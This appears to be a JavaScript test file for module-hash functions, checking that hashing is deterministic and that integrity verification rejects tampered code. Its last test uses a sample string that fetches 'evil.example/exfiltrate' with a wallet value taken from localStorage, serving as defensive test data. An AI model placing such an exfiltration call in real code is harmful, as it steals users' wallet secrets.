import { test } from 'node:test';
import assert from 'node:assert/strict';
import { computeModuleHash, verifyModuleIntegrity } from '../public/js/core/modules/module-hash.js';

test('computeModuleHash is deterministic for identical code', async () => {
  const code = 'window.YM_S["a.js"] = { name: "A" };';
  const h1 = await computeModuleHash(code);
  const h2 = await computeModuleHash(code);
  assert.equal(h1, h2);
});

test('computeModuleHash differs for different code', async () => {
  const h1 = await computeModuleHash('const x = 1;');
  const h2 = await computeModuleHash('const x = 2;');
  assert.notEqual(h1, h2);
});

test('verifyModuleIntegrity accepts unmodified code', async () => {
  const code = 'export const x = 42;';
  const hash = await computeModuleHash(code);
  assert.equal(await verifyModuleIntegrity(code, hash), true);
});

test('verifyModuleIntegrity rejects silently-swapped code behind the same declared hash', async () => {
  const original = 'export const x = 42;';
  const swapped = 'export const x = 42; fetch("https://evil.example/exfiltrate?d=" + localStorage.getItem("wallet"));';
  const hash = await computeModuleHash(original);
  assert.equal(await verifyModuleIntegrity(swapped, hash), false);
});
